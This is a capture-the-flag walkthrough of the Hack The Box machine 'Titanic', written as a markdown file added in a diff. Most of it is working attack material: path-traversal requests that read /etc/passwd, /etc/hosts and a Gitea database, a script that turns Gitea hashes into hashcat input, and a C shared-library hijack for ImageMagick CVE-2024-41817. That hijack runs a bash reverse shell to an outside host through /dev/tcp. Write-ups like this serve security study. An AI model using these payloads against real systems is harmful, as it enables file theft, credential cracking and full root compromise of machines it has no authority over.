@@ -1,0 +1,179 @@
+Title: Titanic
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Titanic was a Linux box built around a Flask-based ticket-booking site fronted by Apache, with a second, developer-facing virtual host discovered only after path traversal leaked `/etc/hosts`. That subdomain exposed a Gitea instance's source, which pointed at the on-disk location of Gitea's own SQLite database, and the same path traversal bug was reused to pull that database directly from the live server. Cracking the PBKDF2-style hashes inside it recovered a reused password for the `developer` system account, giving SSH access and the user flag. Root came from a root-owned cron job that ran a vulnerable version of ImageMagick's `magick identify` against a world-writable image directory: dropping a malicious `libxcb.so.1` into that directory (CVE-2024-41817, an untrusted shared-library search-path flaw) got arbitrary code to run as root the next time the job fired.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.55
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV --script vuln -p22,80 10.10.11.55
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Only SSH and HTTP were open. The scan's service banner referenced `titanic.htb`, so it was added to `/etc/hosts`; browsing directly by IP had redirected to that hostname without resolving.
+
+```
+> nano /etc/hosts
+10.10.11.55  titanic.htb
+```
+
+`nikto` against the plain IP found nothing beyond missing security headers, but re-run against the resolved vhost it flagged a Werkzeug/Python banner masquerading behind Apache, hinting at a Flask app sitting behind a reverse proxy.
+
+## Web Enumeration - Booking Form and Path Traversal
+
+```
+> gobuster dir -u http://titanic.htb/ -w /usr/share/wordlists/dirb/common.txt
+/book                 (Status: 405) [Size: 153]
+/download             (Status: 400) [Size: 41]
+/server-status        (Status: 403) [Size: 276]
+```
+
+Submitting the site's "Book your trip" form triggered a ticket-download request in the browser's network tab:
+
+```
+http://titanic.htb/download?ticket=48966bcf-cf18-41e8-b0b8-3c18f1442d12.json
+```
+
+Swapping the ticket parameter for a relative path confirmed local file inclusion:
+
+```
+http://titanic.htb/download?ticket=../../../../../etc/passwd
+```
+
+The returned `/etc/passwd` showed a normal service account (`www-data`) alongside a real login-capable user, `developer`. Trimming the traversal depth down (the endpoint resolved from three directories deep) and pivoting into `developer`'s home directory pulled the user flag directly through the same bug:
+
+```
+http://titanic.htb/download?ticket=../../../etc/passwd
+http://titanic.htb/download?ticket=../../../home/developer/../../etc/passwd
+http://titanic.htb/download?ticket=../../../home/developer/user.txt
+```
+
+## Subdomain Discovery - Gitea Source Leak
+
+The same traversal was used to pull `/etc/hosts` from the server itself, which revealed a second, internal-only vhost:
+
+```
+http://titanic.htb/download?ticket=../../../etc/hosts
+127.0.0.1 localhost titanic.htb dev.titanic.htb
+127.0.1.1 titanic
+```
+
+Adding `dev.titanic.htb` locally exposed a developer-facing site backed by Gitea. Browsing its hosted repositories turned up the deployment config for the Gitea instance itself:
+
+```
+http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml
+```
+
+which mapped Gitea's data directory to `/home/developer/gitea/data`. Gitea's SQLite database conventionally lives inside that data directory as `gitea.db`, and the same LFI endpoint on the main site was reused to pull it straight off disk:
+
+```
+http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db
+```
+
+## Cracking Gitea Credentials
+
+Gitea stores passwords as salted PBKDF2-SHA256 hashes. The relevant columns were extracted and reformatted into a hashcat-compatible line for every user:
+
+```
+> sqlite3 gitea.db "select passwd, salt, name from user" | while read data; do
+    digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)
+    salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)
+    name=$(echo "$data" | cut -d'|' -f 3)
+    echo "${name}:sha256:50000:${salt}:${digest}"
+done > hash.txt
+```
+
+The usernames had to be stripped from each line before hashcat's PBKDF2-HMAC-SHA256 mode (10900) would accept the file. Cracking against rockyou.txt recovered two credentials, including one for the `developer` account already seen in `/etc/passwd`:
+
+```
+> hashcat -a 0 hash.txt rockyou.txt
+```
+
+recovering `developer`'s password (reused between Gitea and the system account) and a second, unrelated account's credentials.
+
+## Foothold - SSH as developer
+
+```
+> ssh developer@10.10.11.55
+```
+
+The recovered password logged in directly as `developer`, confirming the credential reuse between Gitea and the OS account and lining up with the user flag already read via the LFI.
+
+## Privilege Escalation - ImageMagick Shared Library Hijack (CVE-2024-41817)
+
+`linpeas` didn't surface a clean path directly, so a manual search for root-owned, world-executable scripts was run instead:
+
+```
+victim> find / -iname "*.sh" -user root -perm /u=x,g=x,o=x ! -path "*linux-header*" 2>/dev/null
+```
+
+One result stood out, a script sitting in `/opt/scripts` tied to a niche image-processing service:
+
+```
+-rwxr-xr-x 1 root root   167 Feb  3 17:11 /opt/scripts/identify_images.sh
+
+victim> cat /opt/scripts/identify_images.sh
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+```
+
+This script, run periodically as root, called `/usr/bin/magick identify` against every JPEG in a directory that the `developer` account could write to. Checking the installed version and searching for known issues (the exact release wasn't yet in `searchsploit`, so this took a manual search) surfaced CVE-2024-41817 / GHSA-8rxc-922v-phg8: ImageMagick's AppImage build can end up with an empty `LD_LIBRARY_PATH`/`MAGICK_CONFIGURE_PATH`, causing it to load shared libraries such as `libxcb.so.1` from its current working directory before checking standard system paths.
+
+A malicious replacement for `libxcb.so.1` was compiled and dropped into the watched image directory, using a constructor function so the payload runs immediately on load rather than requiring any specific `magick` subcommand:
+
+```
+victim> cd /opt/app/static/assets/images
+victim> gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("whoami");
+    exit(0);
+}
+EOF
+victim> /usr/bin/magick /dev/null /dev/null
+```
+
+Running `magick` manually from that directory confirmed the hijacked library executed, and running as root once the identity check came back `root`. The payload was then swapped for a reverse shell and a listener started on the attacking host:
+
+```
+> nc -nlvp 443
+victim> cd /opt/app/static/assets/images
+victim> gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.46/443 0>&1'");
+    exit(0);
+}
+EOF
+victim> /usr/bin/magick /dev/null /dev/null
+```
+
+Invoking `magick` again with the malicious library in place caught a shell running as root, either directly or on the next scheduled run of `identify_images.sh`, giving full read access to `/root/root.txt` and completing the box.
+
+## Takeaways
+
+- A generic LFI/path-traversal endpoint is rarely limited to just reading obvious files; reading the server's own `/etc/hosts` is a reliable way to discover internal-only virtual hosts that were never linked from the public site.
+- Source code exposed through an internal Gitea instance (docker-compose files, deployment configs) often documents exactly where an application's data, including its own credential store, lives on disk, turning a read primitive into a full database exfiltration.
+- Password reuse between an application account (here, Gitea) and the underlying OS account is common enough that any cracked application credential is worth trying directly over SSH.
+- Searching for root-owned but world-executable scripts is a fast, low-noise way to find scheduled or service-triggered automation worth reading, especially when a full `linpeas` run doesn't surface anything obvious on its own.
+- Recently disclosed CVEs may not be in `searchsploit` yet; checking a vendor's own advisories (e.g. GitHub Security Advisories) directly is sometimes the only way to find them.
+- ImageMagick's shared-library search-path handling means any directory it's invoked from with write access available to a lower-privileged user is a potential privilege-escalation primitive if a privileged process runs `magick` from inside it: a dropped `libxcb.so.1` with a constructor function executes automatically with the caller's privileges, no special ImageMagick command needed.
